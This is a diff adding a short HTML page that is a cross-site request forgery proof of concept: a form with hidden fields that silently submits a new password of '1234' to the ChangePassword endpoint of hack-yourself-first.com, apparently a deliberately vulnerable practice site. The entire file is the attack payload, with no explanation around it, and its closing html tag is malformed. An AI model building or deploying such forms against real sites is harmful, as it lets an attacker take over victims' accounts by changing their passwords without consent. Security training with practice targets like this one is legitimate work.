@@ -1,0 +1,9 @@
+<html>
+<body>
+<form method="POST" action="https://hack-yourself-first.com/Account/ChangePassword">
+<input type="hidden" name="NewPassword" value="1234"/>
+<input type="hidden" name="ConfirmPassword" value="1234"/>
+<input type="submit" value="Submit">
+</form>
+</body>
+<html>
